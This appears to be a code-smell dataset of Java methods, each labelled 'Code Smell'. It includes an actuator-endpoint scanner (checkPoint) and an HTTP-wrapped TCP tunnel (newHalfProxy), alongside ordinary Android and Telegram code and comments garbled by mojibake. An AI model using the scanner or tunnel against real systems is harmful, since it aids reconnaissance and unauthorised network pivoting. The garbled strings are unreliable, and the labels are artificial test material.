"@Override public void onScrollStateChanged(int state){
  super.onScrollStateChanged(state);
  if (state == SCROLL_STATE_DRAGGING) {
    mNeedAdjust=true;
    mCurView=getLayoutManager().canScrollHorizontally() ? RecyclerViewUtils.getCenterXChild(this) : RecyclerViewUtils.getCenterYChild(this);
    if (mCurView != null) {
      if (mHasCalledOnPageChanged) {
        mPositionBeforeScroll=getChildLayoutPosition(mCurView);
        mHasCalledOnPageChanged=false;
      }
      mFirstLeftWhenDragging=mCurView.getLeft();
      mFirstTopWhenDragging=mCurView.getTop();
    }
 else {
      mPositionBeforeScroll=-1;
    }
    mTouchSpan=0;
  }
 else   if (state == SCROLL_STATE_SETTLING) {
    mNeedAdjust=false;
    if (mCurView != null) {
      if (getLayoutManager().canScrollHorizontally()) {
        mTouchSpan=mCurView.getLeft() - mFirstLeftWhenDragging;
      }
 else {
        mTouchSpan=mCurView.getTop() - mFirstTopWhenDragging;
      }
    }
 else {
      mTouchSpan=0;
    }
    mCurView=null;
  }
 else   if (state == SCROLL_STATE_IDLE) {
    if (mNeedAdjust) {
      int targetPosition=getLayoutManager().canScrollHorizontally() ? RecyclerViewUtils.getCenterXChildPosition(this) : RecyclerViewUtils.getCenterYChildPosition(this);
      if (mCurView != null) {
        targetPosition=getChildAdapterPosition(mCurView);
        if (getLayoutManager().canScrollHorizontally()) {
          int spanX=mCurView.getLeft() - mFirstLeftWhenDragging;
          if (spanX > mCurView.getWidth() * mTriggerOffset && mCurView.getLeft() >= mMaxLeftWhenDragging) {
            if (!reverseLayout)             targetPosition--;
 else             targetPosition++;
          }
 else           if (spanX < mCurView.getWidth() * -mTriggerOffset && mCurView.getLeft() <= mMinLeftWhenDragging) {
            if (!reverseLayout)             targetPosition++;
 else             targetPosition--;
          }
        }
 else {
          int spanY=mCurView.getTop() - mFirstTopWhenDragging;
          if (spanY > mCurView.getHeight() * mTriggerOffset && mCurView.getTop() >= mMaxTopWhenDragging) {
            if (!reverseLayout)             targetPosition--;
 else             targetPosition++;
          }
 else           if (spanY < mCurView.getHeight() * -mTriggerOffset && mCurView.getTop() <= mMinTopWhenDragging) {
            if (!reverseLayout)             targetPosition++;
 else             targetPosition--;
          }
        }
      }
      startSmoothScroll(safeTargetPosition(targetPosition,getItemCount()));
      mCurView=null;
    }
 else     if (mSmoothScrollTargetPosition != mPositionBeforeScroll) {
      if (mOnPageChangedListener != null) {
        mOnPageChangedListener.OnPageChanged(mPositionBeforeScroll,getCurrentPosition());
      }
      mHasCalledOnPageChanged=true;
      mPositionBeforeScroll=mSmoothScrollTargetPosition;
    }
    mMaxLeftWhenDragging=Integer.MIN_VALUE;
    mMinLeftWhenDragging=Integer.MAX_VALUE;
    mMaxTopWhenDragging=Integer.MIN_VALUE;
    mMinTopWhenDragging=Integer.MAX_VALUE;
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.proxyChangedByRotation) {
    listView.forAllChild(view -> {
      RecyclerView.ViewHolder holder=listView.getChildViewHolder(view);
      if (holder.itemView instanceof TextDetailProxyCell) {
        TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
        cell.setChecked(cell.currentInfo == SharedConfig.currentProxy);
        cell.updateStatus();
      }
    }
);
    updateRows(false);
  }
 else   if (id == NotificationCenter.proxySettingsChanged) {
    updateRows(true);
  }
 else   if (id == NotificationCenter.didUpdateConnectionState) {
    int state=ConnectionsManager.getInstance(account).getConnectionState();
    if (currentConnectionState != state) {
      currentConnectionState=state;
      if (listView != null && SharedConfig.currentProxy != null) {
        int idx=proxyList.indexOf(SharedConfig.currentProxy);
        if (idx >= 0) {
          RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(idx + proxyStartRow);
          if (holder != null && holder.itemView instanceof TextDetailProxyCell) {
            TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
            cell.updateStatus();
          }
        }
        if (currentConnectionState == ConnectionsManager.ConnectionStateConnected) {
          updateRows(true);
        }
      }
    }
  }
 else   if (id == NotificationCenter.proxyCheckDone) {
    if (listView != null) {
      if (args.length == 0) {
        updateRows(true);
      }
 else {
        SharedConfig.ProxyInfo proxyInfo=(SharedConfig.ProxyInfo)args[0];
        int idx=proxyList.indexOf(proxyInfo);
        if (idx >= 0) {
          RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(idx + proxyStartRow);
          if (holder != null && holder.itemView instanceof TextDetailProxyCell) {
            TextDetailProxyCell cell=(TextDetailProxyCell)holder.itemView;
            cell.updateStatus();
          }
        }
      }
      boolean checking=false;
      if (!wasCheckedAllList) {
        for (        SharedConfig.ProxyInfo info : proxyList) {
          if (info.checking || info.availableCheckTime == 0) {
            checking=true;
            break;
          }
        }
        if (!checking) {
          wasCheckedAllList=true;
        }
      }
      if (!checking) {
        updateRows(true);
      }
    }
  }
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public void randomTick(Level world,BlockPos pos,FluidState state,RandomSource random){
  if (world.getGameRules().getBoolean(GameRules.RULE_DOFIRETICK)) {
    int i=random.nextInt(3);
    if (i > 0) {
      BlockPos blockpos=pos;
      for (int j=0; j < i; ++j) {
        blockpos=blockpos.offset(random.nextInt(3) - 1,1,random.nextInt(3) - 1);
        if (!world.isLoaded(blockpos)) {
          return;
        }
        BlockState blockstate=world.getBlockState(blockpos);
        if (blockstate.isAir()) {
          if (this.hasFlammableNeighbours(world,blockpos)) {
            if (world.getBlockState(blockpos).getBlock() != Blocks.FIRE) {
              if (DistValidate.isValid(world) && CraftEventFactory.callBlockIgniteEvent(world,blockpos,pos).isCancelled()) {
                continue;
              }
            }
            world.setBlockAndUpdate(blockpos,bridge$forge$fireFluidPlaceBlockEvent(world,blockpos,pos,Blocks.FIRE.defaultBlockState()));
            return;
          }
        }
 else         if (blockstate.blocksMotion()) {
          return;
        }
      }
    }
 else {
      for (int k=0; k < 3; ++k) {
        BlockPos blockpos1=pos.offset(random.nextInt(3) - 1,0,random.nextInt(3) - 1);
        if (!world.isLoaded(blockpos1)) {
          return;
        }
        if (world.isEmptyBlock(blockpos1.above()) && bridge$forge$isFlammable(world,blockpos1,Direction.UP)) {
          BlockPos up=blockpos1.above();
          if (world.getBlockState(up).getBlock() != Blocks.FIRE) {
            if (DistValidate.isValid(world) && CraftEventFactory.callBlockIgniteEvent(world,up,pos).isCancelled()) {
              continue;
            }
          }
          world.setBlockAndUpdate(blockpos1.above(),bridge$forge$fireFluidPlaceBlockEvent(world,blockpos1.above(),pos,Blocks.FIRE.defaultBlockState()));
        }
      }
    }
  }
}",1,Code Smell
"private int positionOfNext(String untilDelim,@Nullable Character stop){
  boolean inMultiLineComment=false;
  boolean inSingleLineComment=false;
  int delimIndex=cursor;
  for (; delimIndex < source.length() - untilDelim.length() + 1; delimIndex++) {
    if (inSingleLineComment && source.charAt(delimIndex) == '\n') {
      inSingleLineComment=false;
    }
 else {
      if (source.length() - untilDelim.length() > delimIndex + 1) {
        if ('#' == source.charAt(delimIndex)) {
          inSingleLineComment=true;
          delimIndex++;
        }
 else switch (source.substring(delimIndex,delimIndex + 2)) {
case ""//"":
case ""/*"":
          inMultiLineComment=true;
        delimIndex++;
      break;
case ""*/"":
    inMultiLineComment=false;
  delimIndex=delimIndex + 2;
break;
}
}
if (!inMultiLineComment && !inSingleLineComment) {
if (stop != null && source.charAt(delimIndex) == stop) return -1;
if (source.startsWith(untilDelim,delimIndex)) {
break;
}
}
}
}
return delimIndex > source.length() - untilDelim.length() ? -1 : delimIndex;
}",1,Code Smell
"@SuppressWarnings(""unchecked"") @Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.messagesDidLoad) {
    int guid=(Integer)args[10];
    if (guid == classGuid) {
      ArrayList<MessageObject> messArr=(ArrayList<MessageObject>)args[2];
      ArrayList<RecentPostInfo> deletedMessages=new ArrayList<>();
      int n=messArr.size();
      for (int i=0; i < n; i++) {
        MessageObject messageObjectFormCache=messArr.get(i);
        int index=recentPostIdtoIndexMap.get(messageObjectFormCache.getId(),-1);
        if (index >= 0 && recentPostsAll.get(index).counters.msg_id == messageObjectFormCache.getId()) {
          if (messageObjectFormCache.deleted) {
            deletedMessages.add(recentPostsAll.get(index));
          }
 else {
            recentPostsAll.get(index).message=messageObjectFormCache;
          }
        }
      }
      recentPostsAll.removeAll(deletedMessages);
      recentPostsLoaded.clear();
      n=recentPostsAll.size();
      for (int i=0; i < n; i++) {
        RecentPostInfo postInfo=recentPostsAll.get(i);
        if (postInfo.message == null) {
          loadFromId=postInfo.counters.msg_id;
          break;
        }
 else {
          recentPostsLoaded.add(postInfo);
        }
      }
      if (recentPostsLoaded.size() < 20) {
        loadMessages();
      }
      if (adapter != null) {
        recyclerListView.setItemAnimator(null);
        diffUtilsCallback.update();
      }
    }
  }
}",1,Code Smell
"public boolean isMatch(String s,String p){
  int m=s.length() + 1, n=p.length() + 1;
  boolean[][] dp=new boolean[m][n];
  dp[0][0]=true;
  for (int j=2; j < n; j+=2)   dp[0][j]=dp[0][j - 2] && p.charAt(j - 1) == '*';
  for (int i=1; i < m; i++) {
    for (int j=1; j < n; j++) {
      if (p.charAt(j - 1) == '*') {
        if (dp[i][j - 2])         dp[i][j]=true;
 else         if (dp[i - 1][j] && s.charAt(i - 1) == p.charAt(j - 2))         dp[i][j]=true;
 else         if (dp[i - 1][j] && p.charAt(j - 2) == '.')         dp[i][j]=true;
      }
 else {
        if (dp[i - 1][j - 1] && s.charAt(i - 1) == p.charAt(j - 1))         dp[i][j]=true;
 else         if (dp[i - 1][j - 1] && p.charAt(j - 1) == '.')         dp[i][j]=true;
      }
    }
  }
  return dp[m - 1][n - 1];
}",1,Code Smell
"private void append(final int[][] successors,final List<List<Integer>> routes,final List<Integer> current,final int index){
  if (index >= successors.length) {
    throw new IllegalStateException();
  }
  if (routes.size() > 500) {
    return;
  }
  if (current.contains(index)) {
    for (int temp=index; temp < successors.length; temp++) {
      if (successors[temp] != null && successors[temp].length == 2) {
        if (current.contains(successors[temp][0]) && !current.contains(successors[temp][1])) {
          append(successors,routes,current,successors[temp][1]);
        }
 else         if (current.contains(successors[temp][1]) && !current.contains(successors[temp][0])) {
          append(successors,routes,current,successors[temp][0]);
        }
        return;
      }
    }
    return;
  }
  current.add(index);
  int[] successor=successors[index];
  if (successor == null || successor.length <= 0) {
    routes.add(current);
    return;
  }
  if (successor.length == 1) {
    append(successors,routes,current,successor[0]);
  }
 else {
    if (mFlowController != null) {
      successor=mFlowController.jump(current,index,successor);
    }
    for (    int i : successor) {
      append(successors,routes,new ArrayList<>(current),i);
    }
  }
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet int_less(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getUnknown(taintRes);
  }
  boolean hasTrue=false;
  boolean hasFalse=false;
  for (  AbsVal op1 : kSet) {
    if (op1.region.isGlobal()) {
      for (      AbsVal op2 : rhs.kSet) {
        if (op2.region.isGlobal()) {
          if (bits <= 64) {
            if (Long.compareUnsigned(op1.value,op2.value) < 0) {
              hasTrue=true;
            }
 else {
              hasFalse=true;
            }
          }
 else {
            BigInteger bigOp1=op1.toBigInteger(bits,false);
            BigInteger bigOp2=op2.toBigInteger(bits,false);
            if (bigOp1.compareTo(bigOp2) < 0) {
              hasTrue=true;
            }
 else {
              hasFalse=true;
            }
          }
          if (hasTrue && hasFalse) {
            return getUnknown(taintRes);
          }
        }
      }
    }
  }
  if (hasTrue && !hasFalse) {
    return getTrue(taintRes);
  }
 else   if (hasFalse && !hasTrue) {
    return getFalse(taintRes);
  }
  return getUnknown(taintRes);
}",1,Code Smell
"public void setInfo(TLRPC.User user){
  if (user != null) {
    setInfo(user.id,user.first_name,user.last_name,null);
    drawDeleted=UserObject.isDeleted(user);
  }
}
public void setInfo(TLObject object){
  if (object instanceof TLRPC.User) {
    setInfo((TLRPC.User)object);
  }
 else   if (object instanceof TLRPC.Chat) {
    setInfo((TLRPC.Chat)object);
  }
 else   if (object instanceof TLRPC.ChatInvite) {
    setInfo((TLRPC.ChatInvite)object);
  }
}
public void setInfo(TLRPC.Chat chat){
  if (chat != null) {
    setInfo(chat.id,chat.title,null,null);
  }
}
public void setInfo(TLRPC.ChatInvite chat){
  if (chat != null) {
    setInfo(0,chat.title,null,null);
  }
}
public void setInfo(long id,String firstName,String lastName){
  setInfo(id,firstName,lastName,null);
}
public void setInfo(long id,String firstName,String lastName,String custom){
  hasGradient=true;
  invalidateTextLayout=true;
  color=getThemedColor(Theme.keys_avatar_background[getColorIndex(id)]);
  color2=getThemedColor(Theme.keys_avatar_background2[getColorIndex(id)]);
  needApplyColorAccent=id == 5;
  avatarType=AVATAR_TYPE_NORMAL;
  drawDeleted=false;
  if (firstName == null || firstName.length() == 0) {
    firstName=lastName;
    lastName=null;
  }
  stringBuilder.setLength(0);
  if (custom != null) {
    stringBuilder.append(custom);
  }
 else {
    if (firstName != null && firstName.length() > 0) {
      stringBuilder.append(takeFirstCharacter(firstName));
    }
    if (lastName != null && lastName.length() > 0) {
      String lastNameLastWord=lastName;
      int index;
      if ((index=lastNameLastWord.lastIndexOf(' ')) >= 0) {
        lastNameLastWord=lastNameLastWord.substring(index + 1);
      }
      if (Build.VERSION.SDK_INT > 17) {
        stringBuilder.append(""\u200C"");
      }
      stringBuilder.append(takeFirstCharacter(lastNameLastWord));
    }
 else     if (firstName != null && firstName.length() > 0) {
      for (int a=firstName.length() - 1; a >= 0; a--) {
        if (firstName.charAt(a) == ' ') {
          if (a != firstName.length() - 1 && firstName.charAt(a + 1) != ' ') {
            int index=stringBuilder.length();
            if (Build.VERSION.SDK_INT > 17) {
              stringBuilder.append(""\u200C"");
            }
            stringBuilder.append(takeFirstCharacter(firstName.substring(index)));
            break;
          }
        }
      }
    }
  }
}",1,Code Smell
"public boolean checkPoint(String target,String point){
  String url=URLUtil.normalizeURL(target) + point;
  System.out.println(""姝ｅ湪妫�娴嬶細\t"" + url);
  HttpResponse response=HTTPUtils.getRequest(url);
  if (response.getStatus() == 200) {
    if (this.checkPoint(url,response)) {
      this.mainController.logTextArea.appendText(Utils.log(""妫�娴嬪埌 "" + point + "" 绔偣瀛樺湪锛屽凡鍋氶獙璇侊細""+ url));
      flag=true;
    }
 else {
      this.mainController.logTextArea.appendText(Utils.log(""妫�娴嬪埌 "" + point + "" 绔偣锛岃鎵嬪伐楠岃瘉: ""+ url));
    }
  }
  return flag;
}
public boolean checkPoint(String url,HttpResponse resp){
  String s=resp.body();
  if (url.contains(""hystrix.stream"")) {
    return ""ping:"".contains(s) || ""data:"".contains(s);
  }
 else   if (url.contains(""health"")) {
    try {
      Map res=(Map)JSON.parse(s);
      return res.containsKey(""status"") || res.containsKey(""diskSpace"");
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""beans"")) {
    Map res;
    try {
      JSONArray objects=JSON.parseArray(s);
      for (      Object o : objects) {
        res=(Map)o;
        return res.containsKey(""bean"") || res.containsKey(""scope"") || res.containsKey(""dependencies"");
      }
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""configprops"")) {
    try {
      Map res=(Map)JSON.parse(s);
      return res.containsKey(""configurationPropertiesReportEndpoint"");
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""mappings"")) {
    return s.contains(""bean"") || s.contains(""method"");
  }
 else   if (url.contains(""metrics"")) {
    return s.contains(""threads"") || s.contains(""heap"");
  }
  return false;
}",1,Code Smell
"/** 
 * 鎵归噺鎻愪氦es鏁版嵁
 */
public static void bulk(List<Function<BulkOperation.Builder,ObjectBuilder<BulkOperation>>> operationList){
  bulk(operationList,operationList.size());
}
/** 
 * 鎵归噺鎻愪氦es鏁版嵁
 * @param num 鍒嗘壒娆℃彁浜わ紝姣忔鎻愪氦澶氬皯鏉
 */
public static void bulk(List<Function<BulkOperation.Builder,ObjectBuilder<BulkOperation>>> operationList,int num){
  if (operationList.isEmpty()) {
    return;
  }
  BulkRequest.Builder bulkRequest=new BulkRequest.Builder();
  boolean submitted=false;
  int size=0;
  for (  Function<BulkOperation.Builder,ObjectBuilder<BulkOperation>> fn : operationList) {
    bulkRequest.operations(fn);
    size++;
    if (size % num == 0) {
      bulk(bulkRequest.build());
      if (operationList.size() != size) {
        bulkRequest=new BulkRequest.Builder();
      }
 else {
        submitted=true;
        break;
      }
    }
  }
  if (!submitted) {
    bulk(bulkRequest.build());
  }
}
/** 
 * 鎵归噺鎻愪氦es鏁版嵁
 * @param bulkRequest request
 */
public static void bulk(BulkRequest bulkRequest){
  bulk(bulkRequest,3);
}
/** 
 * @param bulkRequest request
 * @param retryNum    閲嶈瘯娆℃暟
 */
private static void bulk(BulkRequest bulkRequest,int retryNum){
  if (bulkRequest == null || bulkRequest.operations().isEmpty()) {
    return;
  }
  try {
    BulkResponse responses=getClient().bulk(bulkRequest);
    if (responses.errors()) {
      Set<String> ids=new HashSet<>();
      for (      BulkResponseItem item : responses.items()) {
        if (Objects.equals(SystemCodeEnum.SYSTEM_NO_FOUND.getCode(),item.status())) {
          continue;
        }
        if (item.status() != 200 && item.error() != null) {
          ids.add(item.id());
          if (retryNum == 0) {
            log.warn(""bulk item error:{}"",item.error());
          }
        }
      }
      if (retryNum > 0) {
        BulkRequest.Builder builder=new BulkRequest.Builder();
        boolean hasOperation=false;
        for (        BulkOperation operation : bulkRequest.operations()) {
          String operationId="""";
          if (operation.isCreate()) {
            operationId=operation.create().id();
          }
 else           if (operation.isIndex()) {
            operationId=operation.index().id();
          }
 else           if (operation.isUpdate()) {
            operationId=operation.update().id();
          }
 else           if (operation.isDelete()) {
            operationId=operation.delete().id();
          }
          if (ids.contains(operationId)) {
            builder.operations(operation);
            hasOperation=true;
          }
        }
        if (hasOperation) {
          log.warn(""鎵归噺鎻愪氦es鏁版嵁閲嶈瘯:{}"",retryNum);
          bulk(builder.build(),--retryNum);
        }
      }
    }
  }
 catch (  IOException e) {
    log.error(""bulk寮傚父"",e);
    throw new CrmException(SystemCodeEnum.SYSTEM_SERVER_ERROR);
  }
}",1,Code Smell
"public static int indexOf(CharSequence text,char ch,int fromIndex){
  if (text instanceof String) {
    return ((String)text).indexOf(ch,fromIndex);
  }
  final int max=text.length();
  if (fromIndex < 0) {
    fromIndex=0;
  }
 else   if (fromIndex >= max) {
    return -1;
  }
  for (int i=fromIndex; i < max; i++) {
    if (text.charAt(i) == ch) {
      return i;
    }
  }
  return -1;
}
public static int indexOf(CharSequence source,CharSequence target,int fromIndex){
  if (source instanceof String && target instanceof String) {
    return ((String)source).indexOf((String)target);
  }
  if (fromIndex >= source.length()) {
    return (target.length() == 0 ? source.length() : -1);
  }
  if (fromIndex < 0) {
    fromIndex=0;
  }
  if (target.length() == 0) {
    return fromIndex;
  }
  char first=target.charAt(0);
  int max=(source.length() - target.length());
  for (int i=fromIndex; i <= max; i++) {
    if (source.charAt(i) != first) {
      while (++i <= max && source.charAt(i) != first)       ;
    }
    if (i <= max) {
      int j=i + 1;
      int end=j + target.length() - 1;
      for (int k=1; j < end && source.charAt(j) == target.charAt(k); j++, k++)       ;
      if (j == end) {
        return i;
      }
    }
  }
  return -1;
}",1,Code Smell
"@Override public void executeCondition(Integer slotIndex) throws Exception {
  Executable whileItem=this.getWhileItem();
  whileItem.setCurrChainId(this.getCurrChainId());
  if (!whileItem.isAccess(slotIndex)) {
    return;
  }
  Executable executableItem=this.getDoExecutor();
  Executable breakItem=this.getBreakItem();
  int index=0;
  if (!this.isParallel()) {
    while (getWhileResult(slotIndex,index)) {
      executableItem.setCurrChainId(this.getCurrChainId());
      setLoopIndex(executableItem,index);
      executableItem.execute(slotIndex);
      if (ObjectUtil.isNotNull(breakItem)) {
        breakItem.setCurrChainId(this.getCurrChainId());
        setLoopIndex(breakItem,index);
        breakItem.execute(slotIndex);
        boolean isBreak=breakItem.getItemResultMetaValue(slotIndex);
        if (isBreak) {
          break;
        }
      }
      index++;
    }
  }
 else {
    List<CompletableFuture<LoopFutureObj>> futureList=new ArrayList<>();
    ExecutorService parallelExecutor=ExecutorHelper.loadInstance().buildLoopParallelExecutor();
    while (getWhileResult(slotIndex,index)) {
      CompletableFuture<LoopFutureObj> future=CompletableFuture.supplyAsync(new LoopParallelSupplier(executableItem,this.getCurrChainId(),slotIndex,index),parallelExecutor);
      futureList.add(future);
      if (ObjectUtil.isNotNull(breakItem)) {
        breakItem.setCurrChainId(this.getCurrChainId());
        setLoopIndex(breakItem,index);
        breakItem.execute(slotIndex);
        boolean isBreak=breakItem.getItemResultMetaValue(slotIndex);
        if (isBreak) {
          break;
        }
      }
      index++;
    }
    handleFutureList(futureList);
  }
}",1,Code Smell
"/** 
 * 閲嶅懡鍚嶆枃浠惰矾寰勩��
 * @param path 鍘熸枃浠惰矾寰�
 * @param newPath 鏂版枃浠惰矾寰勶紝鍙互鏄師鏂囦欢璺緞鐨勪笂绾ц矾寰勩�佷笅绾ц矾寰�
 * @return 閲嶅懡鍚嶆竻鍗曪紝缁撴瀯涓猴細<code>鏂版枃浠� -&gt; 鍘熸枃浠�</code>
 * @throws IOException
 */
public static Map<File,File> renameTracked(File path,File newPath) throws IOException {
  Map<File,File> tracks=new HashMap<File,File>();
  renameTracked(tracks,path,newPath);
  return tracks;
}
protected static void renameTracked(Map<File,File> handledFiles,File path,File newPath) throws IOException {
  if (!path.exists() || path.equals(newPath))   return;
  if (path.isDirectory()) {
    File[] children=path.listFiles();
    if (!newPath.exists())     newPath.mkdirs();
    if (!newPath.isDirectory())     throw new IllegalArgumentException(""Target file must be directory"");
    handledFiles.put(newPath,path);
    for (    File child : children) {
      if (!child.exists() || handledFiles.containsKey(child))       continue;
      File childNewFile=null;
      if (child.isDirectory()) {
        childNewFile=getDirectory(newPath,child.getName(),true);
      }
 else {
        childNewFile=getFile(newPath,child.getName());
      }
      renameTracked(handledFiles,child,childNewFile);
    }
    if (path.listFiles().length == 0)     deleteFile(path);
  }
 else   if (newPath.exists() && newPath.isDirectory()) {
    newPath=getFile(newPath,path.getName());
    renameTracked(handledFiles,path,newPath);
  }
 else {
    createParentIfNone(newPath);
    handledFiles.put(newPath,path);
    newPath=IOUtil.copy(path,newPath);
    deleteFile(path);
  }
}",1,Code Smell
"@Override public void onReceive(Context context,Intent intent){
  final String action=intent.getAction();
  final PackageManager manager=context.getPackageManager();
  if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
    if (null == mService) {
      Log.e(TAG,""Called with intent "" + action + "" but we don't know the service: this ""+ ""should never happen"");
      return;
    }
    final Uri packageUri=intent.getData();
    if (null == packageUri)     return;
    final String packageName=packageUri.getSchemeSpecificPart();
    if (null == packageName)     return;
    final PackageInfo packageInfo;
    try {
      packageInfo=manager.getPackageInfo(packageName,PackageManager.GET_PROVIDERS);
    }
 catch (    android.content.pm.PackageManager.NameNotFoundException e) {
      return;
    }
    final ProviderInfo[] providers=packageInfo.providers;
    if (null == providers)     return;
    for (    ProviderInfo info : providers) {
      if (DictionaryPackConstants.AUTHORITY.equals(info.authority)) {
        mService.resetSuggestMainDict();
        return;
      }
    }
  }
 else   if (Intent.ACTION_PACKAGE_REMOVED.equals(action) && !intent.getBooleanExtra(Intent.EXTRA_REPLACING,false)) {
    if (null == mService) {
      Log.e(TAG,""Called with intent "" + action + "" but we don't know the service: this ""+ ""should never happen"");
      return;
    }
    mService.resetSuggestMainDict();
  }
 else   if (DictionaryPackConstants.NEW_DICTIONARY_INTENT_ACTION.equals(action)) {
    if (null == mService) {
      Log.e(TAG,""Called with intent "" + action + "" but we don't know the service: this ""+ ""should never happen"");
      return;
    }
    mService.resetSuggestMainDict();
  }
}
",1,Code Smell
"private void checkListLoad(ViewPage viewPage){
  if (tabsAnimationInProgress || startedTracking || filterTabsView != null && filterTabsView.getVisibility() == View.VISIBLE && filterTabsView.isAnimatingIndicator()) {
    return;
  }
  int firstVisibleItem=viewPage.layoutManager.findFirstVisibleItemPosition();
  int lastVisibleItem=viewPage.layoutManager.findLastVisibleItemPosition();
  int visibleItemCount=Math.abs(viewPage.layoutManager.findLastVisibleItemPosition() - firstVisibleItem) + 1;
  if (lastVisibleItem != RecyclerView.NO_POSITION) {
    RecyclerView.ViewHolder holder=viewPage.listView.findViewHolderForAdapterPosition(lastVisibleItem);
    if (floatingForceVisible=holder != null && holder.getItemViewType() == 11) {
      hideFloatingButton(false);
    }
  }
 else {
    floatingForceVisible=false;
  }
  boolean loadArchived=false;
  boolean loadArchivedFromCache=false;
  boolean load=false;
  boolean loadFromCache=false;
  if (viewPage.dialogsType == 7 || viewPage.dialogsType == 8) {
    ArrayList<MessagesController.DialogFilter> dialogFilters=getMessagesController().dialogFilters;
    if (viewPage.selectedType >= 0 && viewPage.selectedType < dialogFilters.size()) {
      MessagesController.DialogFilter filter=getMessagesController().dialogFilters.get(viewPage.selectedType);
      if ((filter.flags & MessagesController.DIALOG_FILTER_FLAG_EXCLUDE_ARCHIVED) == 0) {
        if (visibleItemCount > 0 && lastVisibleItem >= getDialogsArray(currentAccount,viewPage.dialogsType,1,dialogsListFrozen).size() - 10 || visibleItemCount == 0 && !getMessagesController().isDialogsEndReached(1)) {
          loadArchivedFromCache=!getMessagesController().isDialogsEndReached(1);
          if (loadArchivedFromCache || !getMessagesController().isServerDialogsEndReached(1)) {
            loadArchived=true;
          }
        }
      }
    }
  }
  if (visibleItemCount > 0 && lastVisibleItem >= getDialogsArray(currentAccount,viewPage.dialogsType,folderId,dialogsListFrozen).size() - 10 || visibleItemCount == 0 && (viewPage.dialogsType == 7 || viewPage.dialogsType == 8) && !getMessagesController().isDialogsEndReached(folderId)) {
    loadFromCache=!getMessagesController().isDialogsEndReached(folderId);
    if (loadFromCache || !getMessagesController().isServerDialogsEndReached(folderId)) {
      load=true;
    }
  }
  if (load || loadArchived) {
    boolean loadFinal=load;
    boolean loadFromCacheFinal=loadFromCache;
    boolean loadArchivedFinal=loadArchived;
    boolean loadArchivedFromCacheFinal=loadArchivedFromCache;
    AndroidUtilities.runOnUIThread(() -> {
      if (loadFinal) {
        getMessagesController().loadDialogs(folderId,-1,100,loadFromCacheFinal);
      }
      if (loadArchivedFinal) {
        getMessagesController().loadDialogs(1,-1,100,loadArchivedFromCacheFinal);
      }
    }
);
  }
}",1,Code Smell
"public static void applyForStoryViews(TLRPC.Reaction oldReaction,TLRPC.Reaction newReaction,TL_stories.StoryViews views){
  boolean found=false;
  if (views == null) {
    return;
  }
  for (int i=0; i < views.reactions.size(); i++) {
    TLRPC.ReactionCount reactionCount=views.reactions.get(i);
    if (oldReaction != null) {
      if (compare(reactionCount.reaction,oldReaction)) {
        reactionCount.count--;
        if (reactionCount.count <= 0) {
          views.reactions.remove(i);
          i--;
          continue;
        }
      }
    }
    if (newReaction != null) {
      if (compare(reactionCount.reaction,newReaction)) {
        reactionCount.count++;
        found=true;
      }
    }
  }
  if (!found) {
    TLRPC.ReactionCount reactionCount=new TLRPC.TL_reactionCount();
    reactionCount.count=1;
    reactionCount.reaction=newReaction;
    views.reactions.add(reactionCount);
  }
}",1,Code Smell
"private Mono<Void> newHalfProxy(ServerHttpRequest request,ServerHttpResponse response) throws Exception {
  response.getHeaders().set(""X-Accel-Buffering"",""no"");
  response.getHeaders().setContentType(MediaType.APPLICATION_OCTET_STREAM);
  Sinks.Many<byte[]> sink=Sinks.many().unicast().onBackpressureBuffer();
  Flux<HashMap<String,byte[]>> dataMaps=unmarshal(request.getBody());
  dataMaps.next().subscribeOn(Schedulers.boundedElastic()).subscribe((dataMap -> {
    if (dataMap == null) {
      sink.tryEmitComplete();
      return;
    }
    String clientId=new String(dataMap.get(""id""));
    byte[] actionData=dataMap.get(""ac"");
    if (actionData.length != 1) {
      sink.tryEmitComplete();
      return;
    }
    byte action=actionData[0];
    if (action == 0x02) {
      Object[] obj=(Object[])this.remove(clientId);
      if (obj != null) {
        Connection conn=(Connection)obj[0];
        conn.dispose();
      }
      sink.tryEmitComplete();
      return;
    }
 else     if (action == 0x01) {
      Object[] obj=(Object[])this.get(clientId);
      if (obj == null) {
        sink.tryEmitNext(marshal(newDel()));
      }
 else {
        byte[] data=dataMap.get(""dt"");
        if (data.length != 0) {
          ((NettyOutbound)obj[1]).sendByteArray(Mono.just(data)).then().subscribeOn(Schedulers.boundedElastic()).subscribe();
        }
      }
      sink.tryEmitComplete();
      return;
    }
 else     if (action != 0x00) {
      sink.tryEmitComplete();
      return;
    }
    String host=new String(dataMap.get(""h""));
    int port=Integer.parseInt(new String(dataMap.get(""p"")));
    if (port == 0) {
      InetSocketAddress addr=request.getLocalAddress();
      if (addr != null) {
        host=addr.getHostString();
        port=addr.getPort();
      }
    }
    try {
      TcpClient client=TcpClient.create().host(host).port(port).option(ChannelOption.CONNECT_TIMEOUT_MILLIS,3000).doOnConnected(c -> {
        this.put(clientId,new Object[]{c,c.outbound()});
        sink.tryEmitNext(marshal(newStatus((byte)0x00)));
      }
).doOnDisconnected(s -> {
        this.remove(clientId);
        sink.tryEmitComplete();
      }
);
      client.connect().subscribeOn(Schedulers.boundedElastic()).subscribe(conn -> {
        conn.inbound().receive().asByteArray().flatMap(s -> {
          sink.tryEmitNext(marshal(newData(s)));
          return Mono.empty();
        }
).then().subscribe();
      }
,(err) -> {
        sink.tryEmitNext(marshal(newStatus((byte)0x01)));
        sink.tryEmitComplete();
      }
);
    }
 catch (    Exception e) {
    }
  }
));
  return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap)).then();
}",1,Code Smell
"private void pullSaved(){
